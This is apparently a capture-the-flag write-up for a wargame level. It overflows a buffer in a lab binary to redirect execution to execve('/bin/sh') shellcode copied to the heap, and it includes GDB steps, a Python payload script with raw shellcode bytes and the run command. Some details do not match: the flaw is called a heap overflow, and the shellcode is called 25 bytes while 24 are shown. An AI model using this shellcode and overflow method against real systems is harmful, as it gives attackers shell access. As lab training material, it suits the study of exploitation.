LEVEL_2:
# 📚 Exploiting `level2` – Exploit the overflow to get a shell.
this is a heap overflow, we execute shellcode from the heap using strdup().

Exploit Strategy:</br>

Inject shellcode into local_50 buffer:
  - strdup(local_50) copies this shellcode to heap at a predictable address (found via GDB).
  - Overflow RET to point to the heap address returned by strdup().
  - When p() returns → EIP = heap → shellcode executes → /bin/sh spawns.

Why This Works?</br>

NX disabled → heap is executable(Check only blocks stack addresses, not heap).</br>
ASLR off → heap address is stable (e.g., 0x0804a008).
strdup() gives us a writable+executable space for shellcode.

Find heap address after strdup() using GDB:
```
break *0x0804853d
run < <(python exploit.py)
info registers
```
Craft payload:

Shellcode: 25-byte Linux x86 execve("/bin/sh").

Padding to 76 bytes.</br>
Overwrite EBP (4 bytes).</br>
Overwrite RET with heap address.
```
from struct import pack
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)
heap_addr = 0x0804a008
payload  = shellcode
payload += "A" * (76 - len(shellcode))
payload += "B" * 4
payload += pack("<I", heap_addr)
print(payload)
```

> (python exploit.py; cat) | ./level2
